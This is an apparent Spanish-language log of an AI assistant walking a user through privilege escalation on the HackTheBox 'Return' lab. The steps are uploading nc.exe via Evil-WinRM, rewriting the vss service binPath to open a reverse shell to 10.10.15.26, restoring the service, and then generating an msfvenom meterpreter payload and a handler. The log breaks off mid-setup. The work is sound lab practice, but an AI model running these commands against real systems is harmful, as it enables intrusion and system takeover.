Info: Uploading /home/r4mon/pentest/targets/HTB/easy/Return/nc.exe to C:\Users\svc-printer\Documents\nc.exe
                                        
Error: Upload failed. Check filenames or paths: No such file or directory - No such file or directory /home/r4mon/pentest/targets/HTB/easy/Return/nc.exe

### Hechos verificados

El comando `upload nc.exe` ha fallado porque el fichero no existe en la ruta local desde la que Evil-WinRM intenta subirlo:

```text
/home/r4mon/pentest/targets/HTB/easy/Return/nc.exe
```

El error es local en Parrot, no en la máquina víctima:

```text
No such file or directory /home/r4mon/pentest/targets/HTB/easy/Return/nc.exe
```

### Suposiciones

Antes de volver a intentar cualquier subida, hay que localizar dónde está realmente `nc.exe` en Parrot.

### Método

El siguiente paso único será comprobar si existe algún `nc.exe` disponible en `/usr/share`.

No se debe volver a usar `upload` hasta tener confirmada una ruta local válida.

### Respuesta

Tienes razón. Paramos el encadenado.

Ahora solo hay que localizar el binario. Nada más.

### Comandos

En una terminal de Parrot, fuera de Evil-WinRM:

```bash
find /usr/share -type f -iname 'nc.exe' 2>/dev/null
```

### Comprobaciones

Trae únicamente la salida de ese comando.

Criterio de decisión:

```text
Si devuelve una ruta:
se usará esa ruta exacta en el siguiente paso.

Si no devuelve nada:
se buscará otra fuente local o se elegirá otra táctica sin depender de nc.exe.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> find /usr/share -type f -iname 'nc.exe' 2>/dev/null
Could not find a part of the path 'C:\dev\null'.
At line:1 char:1
+ find /usr/share -type f -iname 'nc.exe' 2>/dev/null
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand

### Objetivo

Corregir el error de contexto: ese comando debe ejecutarse en Parrot, no dentro de Evil-WinRM.

### Hechos verificados

El comando se ejecutó dentro de PowerShell remoto:

```text
*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```

Por eso falló esta parte:

```text
2>/dev/null
```

PowerShell intentó interpretar `/dev/null` como una ruta de Windows y devolvió:

```text
Could not find a part of the path 'C:\dev\null'
```

### Suposiciones

La sesión Evil-WinRM sigue abierta en la máquina víctima.

La búsqueda de `nc.exe` debe hacerse en la máquina atacante, es decir, en una terminal local de Parrot.

### Método

No se ejecuta nada más en la víctima hasta localizar primero el binario local.

### Respuesta

Ese comando ha ido al sitio equivocado. No pasa nada: error de contexto, no error técnico de la vía.

Ahora sal de esa línea mental: **Evil-WinRM es Windows remoto**.
El siguiente comando va en **otra terminal de Parrot**, no en Evil-WinRM.

### Comandos

En una terminal local de Parrot:

```bash
find /usr/share -type f -iname 'nc.exe' 2>/dev/null
```

### Comprobaciones

Trae solo la salida de ese comando.

Criterio de decisión:

```text
Si aparece una ruta:
se usará esa ruta exacta en el siguiente paso.

Si no aparece ninguna ruta:
se buscará otra opción local sin volver a intentar upload todavía.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> find /usr/share -type f -iname 'nc.exe' 2>/dev/null
Could not find a part of the path 'C:\dev\null'.
At line:1 char:1
+ find /usr/share -type f -iname 'nc.exe' 2>/dev/null
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand

### Objetivo

Corregir el contexto de ejecución antes de continuar. Ahora mismo se está ejecutando un comando Linux dentro de una shell PowerShell remota, por eso falla.

### Hechos verificados

El prompt confirma que sigues dentro de Evil-WinRM:

```text
*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```

Ese entorno es Windows remoto, no Parrot.

El error vuelve a producirse porque PowerShell interpreta `/dev/null` como una ruta de Windows:

```text
Could not find a part of the path 'C:\dev\null'
```

### Suposiciones

La sesión Evil-WinRM sigue abierta y no hace falta cerrarla.

El siguiente paso debe ser únicamente verificar que estamos en una terminal local de Parrot antes de buscar `nc.exe`.

### Método

No se ejecuta ningún comando más dentro de Evil-WinRM hasta que se confirme una terminal local correcta.

### Respuesta

Para aquí en Evil-WinRM.

No escribas nada más en esta ventana:

```text
*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```

Abre **otra terminal local de Parrot**. Tiene que tener un prompt parecido a este:

```text
❯
```

No debe empezar por:

```text
*Evil-WinRM*
```

### Comandos

En la terminal local de Parrot, ejecuta solo esto:

```bash
pwd
```

### Comprobaciones

Pásame únicamente la salida de `pwd`.

Criterio de decisión:

```text
Si la ruta es /home/r4mon/... o similar:
seguimos buscando nc.exe desde Parrot.

Si vuelve a aparecer *Evil-WinRM*:
seguimos en la terminal equivocada y no avanzamos todavía.
```
### Ejecutamos:

❯ find /usr/share -type f -iname 'nc.exe' 2>/dev/null
/usr/share/Seclists/SecLists/Web-Shells/FuzzDB/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe

### Objetivo

Copiar un `nc.exe` confirmado al directorio local del laboratorio para poder subirlo después desde Evil-WinRM.

### Hechos verificados

Se han localizado dos rutas locales válidas en Parrot:

```text
/usr/share/Seclists/SecLists/Web-Shells/FuzzDB/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
```

El trabajo está situado en:

```text
/home/r4mon/pentest/targets/HTB/easy/Return
```

### Suposiciones

La ruta en minúsculas `/usr/share/seclists/...` es suficiente para copiar el binario al directorio actual.

### Método

Siguiente paso único: copiar `nc.exe` al directorio actual y comprobar únicamente si el comando devuelve copia correcta o error.

### Respuesta

Ahora solo copiaremos el binario. No intentes todavía subirlo por Evil-WinRM.

### Comandos

En la terminal local de Parrot:

```bash
cp -v /usr/share/seclists/Web-Shells/FuzzDB/nc.exe ./nc.exe
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si copia correctamente:
el siguiente paso será verificar que ./nc.exe existe en el directorio actual.

Si falla:
usaremos la otra ruta localizada.
```
### Ejecutamos:

❯ cp -v /usr/share/seclists/Web-Shells/FuzzDB/nc.exe ./nc.exe
'/usr/share/seclists/Web-Shells/FuzzDB/nc.exe' -> './nc.exe'

### Objetivo

Verificar que `nc.exe` existe ahora en el directorio local del laboratorio antes de intentar subirlo por Evil-WinRM.

### Hechos verificados

La copia local se ha realizado correctamente:

```text
'/usr/share/seclists/Web-Shells/FuzzDB/nc.exe' -> './nc.exe'
```

### Suposiciones

El fichero `./nc.exe` debería estar ahora disponible en:

```text
/home/r4mon/pentest/targets/HTB/easy/Return/nc.exe
```

### Método

Antes de volver a Evil-WinRM, se comprobará que el fichero existe, tiene tamaño y es legible desde Parrot.

### Respuesta

Bien. Ahora solo verificamos el fichero local. Nada de subir todavía.

### Comandos

En la terminal local de Parrot:

```bash
ls -lh ./nc.exe
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si ./nc.exe existe y tiene tamaño distinto de 0:
el siguiente paso será subirlo desde Evil-WinRM.

Si no existe o pesa 0:
buscaremos otra copia válida.
```
### Ejecutamos:

❯ ls -lh ./nc.exe
.rwxr-xr-x r4mon r4mon 28 KB Fri May  8 18:38:54 2026  ./nc.exe

### Objetivo

Subir `nc.exe` desde el directorio local confirmado hacia la sesión Evil-WinRM.

### Hechos verificados

El fichero existe en el directorio local del laboratorio y tiene tamaño válido:

```text
./nc.exe
28 KB
```

La ruta local ya es la que Evil-WinRM intentaba usar antes:

```text
/home/r4mon/pentest/targets/HTB/easy/Return/nc.exe
```

### Suposiciones

Como `nc.exe` ya existe localmente, el comando `upload nc.exe` debería poder resolverlo correctamente desde Evil-WinRM.

### Método

Se ejecutará un único paso: subir el binario a `C:\Users\svc-printer\Documents\nc.exe`.

### Respuesta

Ahora vuelve a la ventana de Evil-WinRM y ejecuta solo la subida. No configures todavía el servicio.

### Comandos

En Evil-WinRM:

```powershell
upload nc.exe
```

### Comprobaciones

Pásame solo la salida del comando `upload nc.exe`.

Criterio de decisión:

```text
Si la subida funciona:
el siguiente paso será comprobar que nc.exe existe en la máquina víctima.

Si la subida falla:
se revisará el directorio local desde el que Evil-WinRM está resolviendo rutas.
```
### Ejecutamos:

                                        
Info: Uploading /home/r4mon/pentest/targets/HTB/easy/Return/nc.exe to C:\Users\svc-printer\Documents\nc.exe
                                        
Data: 37544 bytes of 37544 bytes copied
                                        
Info: Upload successful!

### Objetivo

Verificar que `nc.exe` quedó realmente subido en la máquina víctima antes de usarlo en el servicio `vss`.

### Hechos verificados

La subida de `nc.exe` desde Parrot a la máquina víctima se completó correctamente:

```text
Data: 37544 bytes of 37544 bytes copied
Info: Upload successful!
```

El destino indicado por Evil-WinRM fue:

```text
C:\Users\svc-printer\Documents\nc.exe
```

### Suposiciones

El fichero debería existir ahora en el directorio actual de la sesión WinRM.

Antes de modificar `vss`, hay que confirmar que el binario está presente y accesible desde la víctima.

### Método

El siguiente paso único es comprobar la existencia del binario en Windows.

### Respuesta

Bien, la subida ya está hecha. Ahora solo verificamos el fichero en la víctima.

### Comandos

En Evil-WinRM:

```powershell
Get-ChildItem -Force C:\Users\svc-printer\Documents\nc.exe
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si nc.exe aparece con tamaño válido:
el siguiente paso será abrir el listener en Parrot.

Si no aparece:
se revisará el directorio remoto actual antes de tocar vss.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-ChildItem -Force C:\Users\svc-printer\Documents\nc.exe


    Directory: C:\Users\svc-printer\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/8/2026   9:58 AM          28160 nc.exe

### Objetivo

Preparar el listener en Parrot antes de modificar el servicio `vss`.

### Hechos verificados

`nc.exe` existe en la máquina víctima:

```text
C:\Users\svc-printer\Documents\nc.exe
```

El tamaño del fichero remoto es válido:

```text
28160 nc.exe
```

La subida ya no es el problema. El binario está disponible para ser ejecutado desde el servicio.

### Suposiciones

El siguiente paso debe hacerse en la máquina atacante, no dentro de Evil-WinRM.

La IP VPN que se usará para la conexión inversa sigue siendo:

```text
10.10.15.26
```

### Método

Antes de tocar `vss`, hay que dejar escuchando el puerto de recepción en Parrot.

No se configura aún el servicio hasta confirmar que el listener está abierto.

### Respuesta

Ahora abre **una terminal local de Parrot** y deja el listener escuchando. No ejecutes todavía ningún comando en Evil-WinRM.

### Comandos

En Parrot:

```bash
rlwrap -cAr nc -lvnp 1234
```

### Comprobaciones

Pásame solo la salida inicial del listener.

Criterio de decisión:

```text
Si aparece listening on:
el siguiente paso será modificar vss para ejecutar nc.exe.

Si da error de puerto ocupado:
cambiaremos de puerto antes de tocar el servicio.
```

### Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/Return/
❯ rlwrap -cAr nc -lvnp 1234
listening on [any] 1234 ...

### Objetivo

Configurar temporalmente el servicio `vss` para que ejecute `nc.exe` y conecte al listener ya abierto en Parrot.

### Hechos verificados

El listener está activo en Parrot:

```text
listening on [any] 1234 ...
```

`nc.exe` ya existe en la máquina víctima:

```text
C:\Users\svc-printer\Documents\nc.exe
```

### Suposiciones

La IP VPN atacante sigue siendo:

```text
10.10.15.26
```

El servicio `vss` sigue siendo modificable por `svc-printer`.

### Método

Un único paso: modificar el `binPath` de `vss`.

No se iniciará todavía el servicio hasta confirmar que el cambio se ha aplicado correctamente.

### Respuesta

Ahora vuelve a Evil-WinRM y ejecuta solo la configuración del servicio.

### Comandos

En Evil-WinRM:

```powershell
sc.exe config vss binPath= "C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.15.26 1234"
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si devuelve ChangeServiceConfig SUCCESS:
el siguiente paso será comprobar el binPath con sc.exe qc vss.

Si devuelve error:
se corregirá antes de iniciar el servicio.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.15.26 1234"
[SC] ChangeServiceConfig SUCCESS

### Objetivo

Comprobar que `vss` quedó configurado exactamente con `nc.exe` antes de iniciar el servicio.

### Hechos verificados

La modificación del servicio se aplicó correctamente:

```text
[SC] ChangeServiceConfig SUCCESS
```

El listener en Parrot sigue siendo el destino esperado:

```text
10.10.15.26:1234
```

### Suposiciones

Aunque `ChangeServiceConfig` haya sido correcto, conviene verificar el `BINARY_PATH_NAME` antes de arrancar `vss`.

### Método

Siguiente paso único: consultar la configuración actual del servicio.

### Respuesta

Bien. Ahora no arranques aún el servicio. Primero confirmamos que el `binPath` quedó exactamente como se espera.

### Comandos

En Evil-WinRM:

```powershell
sc.exe qc vss
```

### Comprobaciones

Pásame solo la salida de `sc.exe qc vss`.

Criterio de decisión:

```text
Si BINARY_PATH_NAME apunta a nc.exe con 10.10.15.26 1234:
el siguiente paso será iniciar vss.

Si no apunta a nc.exe:
se corrige antes de tocar el servicio.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.15.26 1234
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem

### Objetivo

Iniciar el servicio `vss` para que ejecute el `binPath` ya configurado y comprobar si llega la conexión inversa al listener abierto en Parrot.

### Hechos verificados

El servicio `vss` quedó configurado correctamente con `nc.exe`:

```text
BINARY_PATH_NAME : C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.15.26 1234
```

El servicio se ejecuta como:

```text
SERVICE_START_NAME : LocalSystem
```

### Suposiciones

El listener en Parrot sigue activo en el puerto `1234`.

Si el servicio ejecuta el binario correctamente, debería llegar una conexión inversa al listener.

### Método

Siguiente paso único: iniciar `vss`.

No se hará nada más hasta comprobar si llega conexión.

### Respuesta

Ahora sí: inicia el servicio. Aunque aparezca un error `1053`, lo importante será mirar si el listener recibe shell.

### Comandos

En Evil-WinRM:

```powershell
sc.exe start vss
```

### Comprobaciones

Pásame solo dos cosas:

```text
1. La salida de sc.exe start vss.
2. Si en el listener aparece conexión o no.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss

❯ cd /home/r4mon/pentest/targets/HTB/easy/Return/
❯ rlwrap -cAr nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.15.26] from (UNKNOWN) [10.129.95.241] 62773
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

### Objetivo

Confirmar el contexto real de la shell recibida por el listener antes de continuar hacia la flag final.

### Hechos verificados

El servicio `vss` fue iniciado tras modificar su `BINARY_PATH_NAME`.

El listener recibió una conexión desde la máquina víctima:

```text
connect to [10.10.15.26] from (UNKNOWN) [10.129.95.241] 62773
```

La sesión recibida es una consola Windows:

```text
Microsoft Windows [Version 10.0.17763.107]
C:\Windows\system32>
```

### Suposiciones

La shell probablemente se ha ejecutado con el contexto del servicio `vss`, que estaba configurado como `LocalSystem`.

Todavía hay que confirmarlo con evidencia directa.

### Método

El siguiente paso único es comprobar la identidad efectiva de la nueva shell.

### Respuesta

Bien. Ya tenemos shell inversa. Ahora no hagas nada más todavía: primero confirma si realmente es `SYSTEM`.

### Comandos

En la shell recibida del listener:

```cmd
whoami
```

### Comprobaciones

Pásame solo la salida de `whoami`.

Criterio de decisión:

```text
Si devuelve nt authority\system:
la escalada queda confirmada y el siguiente paso será leer root.txt.

Si devuelve return\svc-printer u otro usuario:
habrá que revisar qué contexto ejecutó realmente el servicio.
```
### Ejecutamos:


C:\Windows\system32>whoami

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

Se cae la conexion

### Objetivo

Interpretar la caída de la shell inversa y estabilizar el flujo antes de seguir. No se continuará encadenando pasos hasta dejar claro el estado del servicio `vss`.

### Hechos verificados

La conexión inversa llegó correctamente al listener:

```text
connect to [10.10.15.26] from (UNKNOWN) [10.129.95.241] 62773
```

La shell llegó a abrirse en contexto Windows:

```text
C:\Windows\system32>
```

Al intentar interactuar con ella, la conexión se cayó antes de obtener salida de `whoami`.

El arranque del servicio devuelve el error esperado para este tipo de abuso:

```text
[SC] StartService FAILED 1053:
The service did not respond to the start or control request in a timely fashion.
```

### Suposiciones

La ejecución del servicio funciona, porque la conexión llegó.

La shell con `nc.exe -e cmd.exe` es inestable en este caso. Esto encaja con el comportamiento típico de un binario lanzado desde el Service Control Manager que no se comporta como servicio real.

Antes de repetir o cambiar a una shell más estable, hay que restaurar `vss` para no acumular estados raros.

### Método

Hallazgo dominante actual:

```text
La primitiva de ejecución como servicio funciona, pero la shell interactiva con nc.exe es inestable.
```

Rama principal activa:

```text
Escalada por modificación de servicio.
```

Ramas secundarias:

```text
Shell nc.exe:
Funciona, pero es inestable.

Shell más estable:
Pendiente de preparar después de restaurar el servicio.

SeBackupPrivilege / SeRestorePrivilege:
Sigue en espera.
```

Siguiente paso único:

```text
Restaurar vss a su binario original y confirmar que queda limpio.
```

### Respuesta

Sí, se cae, pero esto no invalida la vía. La conexión llegó, así que el servicio ejecutó el binario. El problema es estabilidad de la shell.

Ahora toca **restaurar `vss`**. Solo eso. Después decidimos la siguiente táctica.

### Comandos

En Evil-WinRM, ejecuta solo esto:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si devuelve ChangeServiceConfig SUCCESS:
el siguiente paso será confirmar con sc.exe qc vss.

Si devuelve error:
no seguimos hasta restaurar correctamente el servicio.
```

### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
[SC] ChangeServiceConfig SUCCESS

### Objetivo

Confirmar que el servicio `vss` ha quedado restaurado a su binario original antes de seguir con otra táctica.

### Hechos verificados

La restauración del `binPath` ha sido aceptada:

```text
[SC] ChangeServiceConfig SUCCESS
```

### Suposiciones

El servicio debería volver a apuntar a:

```text
C:\Windows\system32\vssvc.exe
```

Pero todavía hay que comprobarlo con la configuración real del servicio.

### Método

No se continúa con otra acción hasta verificar que `vss` está limpio.

### Respuesta

Bien. Ahora solo confirmamos que `vss` ha quedado restaurado correctamente.

### Comandos

En Evil-WinRM:

```powershell
sc.exe qc vss
```

### Comprobaciones

Pásame solo la salida de `sc.exe qc vss`.

Criterio de decisión:

```text
Si BINARY_PATH_NAME vuelve a ser C:\Windows\system32\vssvc.exe:
el servicio queda restaurado y podremos cambiar a una táctica más estable.

Si sigue apuntando a nc.exe:
no avanzamos hasta restaurarlo.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem

### Objetivo

Cambiar a una táctica más estable para la shell privilegiada, empezando por comprobar en Parrot si está disponible la herramienta necesaria para generar una sesión más robusta.

### Hechos verificados

El servicio `vss` ha quedado restaurado correctamente:

```text
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
```

La vía de modificación de servicio funciona, pero la shell con `nc.exe` ha resultado inestable.

### Suposiciones

Una sesión más estable requiere preparar el binario desde Parrot antes de volver a tocar `vss`.

Antes de generar nada, hay que confirmar que `msfvenom` existe en la máquina atacante.

### Método

No se modificará de nuevo el servicio hasta tener preparado y verificado el binario local.

Siguiente paso único:

```text
Comprobar si msfvenom está disponible en Parrot.
```

### Respuesta

Perfecto, `vss` ya está limpio. Ahora cambiamos de táctica, pero seguimos paso a paso.

Primero vamos a comprobar si tienes `msfvenom` disponible en Parrot. Solo eso.

### Comandos

En una terminal local de Parrot:

```bash
which msfvenom
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si devuelve una ruta:
se usará msfvenom para preparar una shell más estable.

Si no devuelve nada:
buscaremos una alternativa local antes de volver a tocar el servicio vss.
```
### Ejecutamos:

❯ which msfvenom
/usr/bin/msfvenom

### Objetivo

Generar localmente en Parrot un ejecutable de conexión inversa más estable para Windows, antes de volver a tocar el servicio `vss`.

### Hechos verificados

`msfvenom` está disponible en Parrot:

```text
/usr/bin/msfvenom
```

El servicio `vss` quedó restaurado correctamente antes de cambiar de táctica.

La IP VPN usada durante el laboratorio es:

```text
10.10.15.26
```

### Suposiciones

Se usará el puerto `1337` para esta nueva conexión, separado del puerto `1234` usado antes con `nc.exe`.

El fichero se generará en el directorio local del laboratorio de Return.

### Método

El siguiente paso único es crear el ejecutable local y comprobar después si se ha generado correctamente.

### Respuesta

Ahora solo generamos el binario local. No lo subas todavía.

### Comandos

En la terminal local de Parrot:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.26 LPORT=1337 -f exe -o shell.exe
```

### Comprobaciones

Pásame solo la salida de `msfvenom`.

Criterio de decisión:

```text
Si shell.exe se genera correctamente:
el siguiente paso será verificar que existe y tiene tamaño válido.

Si msfvenom falla:
se corregirá el error antes de intentar subir nada.
```
### Ejecutamos:

❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.26 LPORT=1337 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe

### Objetivo

Verificar que `shell.exe` se ha generado correctamente en el directorio local del laboratorio antes de intentar subirlo a la máquina víctima.

### Hechos verificados

`msfvenom` ha generado correctamente el ejecutable:

```text
Saved as: shell.exe
```

El payload generado es para Windows x86:

```text
No platform was selected, choosing Msf::Module::Platform::Windows
No arch selected, selecting arch: x86
```

El tamaño final informado es:

```text
Final size of exe file: 73802 bytes
```

### Suposiciones

El fichero `shell.exe` debería existir ahora en:

```text
/home/r4mon/pentest/targets/HTB/easy/Return/shell.exe
```

### Método

Antes de subir el binario por Evil-WinRM, se comprobará que existe localmente y que tiene un tamaño coherente.

### Respuesta

Perfecto. Ahora solo verificamos el fichero local.

### Comandos

En la terminal local de Parrot:

```bash
ls -lh ./shell.exe
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si shell.exe existe y pesa alrededor de 72 KB:
el siguiente paso será preparar el listener de Metasploit.

Si no existe o pesa 0:
se regenerará antes de subir nada.
```
### Ejecutamos:

❯ ls -lh ./shell.exe
.rw-r--r-- r4mon r4mon 72 KB Fri May  8 18:51:23 2026  ./shell.exe

### Objetivo

Abrir Metasploit en Parrot para preparar después el listener del payload `windows/meterpreter/reverse_tcp`.

### Hechos verificados

El binario `shell.exe` existe localmente y tiene tamaño coherente:

```text
./shell.exe
72 KB
```

El payload fue generado para conectar hacia:

```text
10.10.15.26:1337
```

### Suposiciones

Metasploit está instalado y se podrá abrir desde la terminal local de Parrot.

Aún no se va a configurar el handler ni se va a subir `shell.exe`.

### Método

Siguiente paso único: abrir `msfconsole`.

### Respuesta

Bien. El binario está listo. Ahora solo abre Metasploit; no configures nada todavía.

### Comandos

En la terminal local de Parrot:

```bash
msfconsole
```

### Comprobaciones

Pásame solo la salida inicial hasta que aparezca el prompt:

```text
msf6 >
```

Criterio de decisión:

```text
Si aparece msf6 >:
el siguiente paso será seleccionar el módulo multi/handler.

Si msfconsole falla:
se resolverá ese error antes de continuar.
```
### Ejecutamos:

❯ msfconsole
Metasploit tip: Use the analyze command to suggest runnable modules for 
hosts
                                                  
 ______________________________________
/ it looks like you're trying to run a \
\ module                               /
 --------------------------------------
 \
  \
     __
    /  \
    |  |
    @  @
    |  |
    || |/
    || ||
    |\_/|
    \___/


       =[ metasploit v6.4.43-dev                          ]
+ -- --=[ 2484 exploits - 1279 auxiliary - 431 post       ]
+ -- --=[ 1463 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[msf](Jobs:0 Agents:0) >> 

### Objetivo

Seleccionar el módulo `multi/handler` en Metasploit para preparar el listener del payload ya generado.

### Hechos verificados

Metasploit se ha abierto correctamente:

```text
metasploit v6.4.43-dev
```

El prompt está disponible:

```text
[msf](Jobs:0 Agents:0) >>
```

El binario `shell.exe` fue generado previamente con:

```text
windows/meterpreter/reverse_tcp
LHOST=10.10.15.26
LPORT=1337
```

### Suposiciones

El siguiente paso es seleccionar el módulo que escuchará la conexión inversa del ejecutable.

No se configurará todavía el payload ni el puerto hasta confirmar que el módulo se carga correctamente.

### Método

Siguiente paso único:

```text
Cargar exploit/multi/handler en Metasploit.
```

### Respuesta

Metasploit está listo. Ahora solo carga el handler.

### Comandos

En Metasploit:

```text
use exploit/multi/handler
```

### Comprobaciones

Pásame solo la salida tras ejecutar ese comando.

Criterio de decisión:

```text
Si el prompt cambia a exploit/multi/handler:
el siguiente paso será configurar el payload.

Si devuelve error:
se corrige antes de configurar nada más.
```

### Ejecutamos:

[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp

### Objetivo

Configurar el payload correcto en el handler de Metasploit para que coincida con el ejecutable `shell.exe` generado previamente.

### Hechos verificados

El módulo `exploit/multi/handler` se ha cargado correctamente.

Metasploit ha seleccionado por defecto un payload genérico:

```text id="iupk2m"
generic/shell_reverse_tcp
```

Ese payload no coincide con el ejecutable generado, que usa:

```text id="v5zfw5"
windows/meterpreter/reverse_tcp
```

### Suposiciones

Antes de configurar `LHOST` y `LPORT`, hay que corregir el payload del handler.

### Método

Siguiente paso único:

```text id="m9pfyx"
Cambiar el payload del handler a windows/meterpreter/reverse_tcp.
```

### Respuesta

Bien, pero hay que corregir el payload porque Metasploit ha puesto uno genérico por defecto.

Ejecuta solo este comando.

### Comandos

En Metasploit:

```text id="kkf3wb"
set PAYLOAD windows/meterpreter/reverse_tcp
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text id="ox0cqi"
Si confirma PAYLOAD => windows/meterpreter/reverse_tcp:
el siguiente paso será configurar LHOST.

Si da error:
se revisará el nombre del payload antes de seguir.
```
### Ejecutamos:

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp

### Objetivo

Configurar `LHOST` en Metasploit para que el handler escuche en la IP VPN correcta.

### Hechos verificados

El payload del handler ya coincide con el ejecutable generado:

```text
PAYLOAD => windows/meterpreter/reverse_tcp
```

El ejecutable `shell.exe` fue generado para conectar hacia:

```text
10.10.15.26
```

### Suposiciones

`10.10.15.26` sigue siendo la IP activa de la interfaz VPN `tun0`.

### Método

Siguiente paso único:

```text
Configurar LHOST con la IP VPN usada al generar shell.exe.
```

### Respuesta

Bien. Ahora configura solo `LHOST`.

### Comandos

En Metasploit:

```text
set LHOST 10.10.15.26
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si confirma LHOST => 10.10.15.26:
el siguiente paso será configurar LPORT.

Si muestra otra IP o error:
se corregirá antes de seguir.
```
### Ejecutamos:

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.15.26
LHOST => 10.10.15.26

### Objetivo

Configurar `LPORT` en Metasploit para que el handler escuche en el mismo puerto usado al generar `shell.exe`.

### Hechos verificados

`LHOST` ha quedado configurado correctamente:

```text
LHOST => 10.10.15.26
```

El ejecutable `shell.exe` fue generado para conectar al puerto:

```text
1337
```

### Suposiciones

El puerto `1337` está libre en Parrot y será usado por el handler de Metasploit.

### Método

Siguiente paso único:

```text
Configurar LPORT con el puerto 1337.
```

### Respuesta

Perfecto. Ahora configura solo `LPORT`.

### Comandos

En Metasploit:

```text
set LPORT 1337
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si confirma LPORT => 1337:
el siguiente paso será revisar las opciones del handler.

Si devuelve error:
se corregirá antes de arrancar el listener.
```
### Ejecutamos:

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 1337
LPORT => 1337

### Objetivo

Revisar la configuración del handler antes de arrancar el listener de Metasploit.

### Hechos verificados

`LPORT` ha quedado configurado correctamente:

```text
LPORT => 1337
```

El handler ya tiene configurados estos valores clave:

```text
PAYLOAD: windows/meterpreter/reverse_tcp
LHOST: 10.10.15.26
LPORT: 1337
```

### Suposiciones

Antes de ejecutar el handler, conviene confirmar visualmente que las opciones coinciden con el binario `shell.exe` generado.

### Método

Siguiente paso único:

```text
Mostrar las opciones actuales del módulo multi/handler.
```

### Respuesta

Bien. Ahora solo revisamos opciones. No ejecutes todavía `run`.

### Comandos

En Metasploit:

```text
show options
```

### Comprobaciones

Pásame solo la salida de `show options`.

Criterio de decisión:

```text
Si PAYLOAD, LHOST y LPORT son correctos:
el siguiente paso será arrancar el handler.

Si algún valor no coincide:
